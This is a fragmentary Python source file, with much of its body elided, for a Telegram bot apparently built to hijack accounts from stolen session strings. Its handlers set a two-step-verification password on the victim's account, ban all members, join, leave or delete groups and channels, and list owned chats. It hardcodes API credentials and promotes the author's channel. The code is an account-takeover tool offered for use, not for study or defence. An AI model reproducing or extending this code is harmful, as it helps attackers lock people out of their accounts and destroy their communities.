...
client = TelegramClient('TH3_LA5T_KN1GHT', api_id, api_hash).start(bot_token=token)
...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X.edit_2fa('THE LAST KNIGHT IS BEST')
      return True
    except:
      return False
...
channel = "@KNIGHT_KINGDOM"
menu = '''

"A" :~ ❤️[Check user own groups and channels]🥀
...
'''
mm = '''
**⚜NOTICE FIRST JOIN Our GROUP @KNIGHT_KINGDOM⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/TH3_LA5T_KN1GHT")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    await event.reply("Click Below To Use Me", buttons=THELASTKNIGHT)
  else:
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/KNIGHT_KINGDOM")
        ]
      ]
    await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=Knight)
...
async def op(event):
  ...
  await event.reply("Click Below To Use Me", buttons=LASTKNIGHT)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Banning all members. Thanks For using our Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\nThanks For using our Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Joined the Channel/Group Thanks For using our Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Leaved the Channel/Group Thanks For using our Bot,", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("Deleted the Channel/Group Thanks For using our bot.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `last knight Bot Is best` you can login now\n\nThanks For using our Bot.", buttons=keyboard)
      else:
